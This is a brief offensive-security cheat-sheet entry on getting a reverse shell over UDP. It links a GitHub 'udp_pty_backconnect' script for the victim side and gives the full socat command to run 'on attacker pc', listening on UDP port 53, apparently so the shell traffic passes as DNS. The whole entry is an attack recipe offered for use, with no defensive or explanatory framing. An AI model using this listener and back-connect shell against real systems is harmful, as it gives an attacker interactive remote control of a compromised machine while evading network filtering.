## USING THE UDP TO GET THE SHELL
`` [https://github.com/infodox/python-pty-shells/blob/master/udp_pty_backconnect.py](https://github.com/infodox/python-pty-shells/blob/master/udp_pty_backconnect.py)

on attacker pc --> socat file:`tty`,raw,echo=0 udp-listen:53``
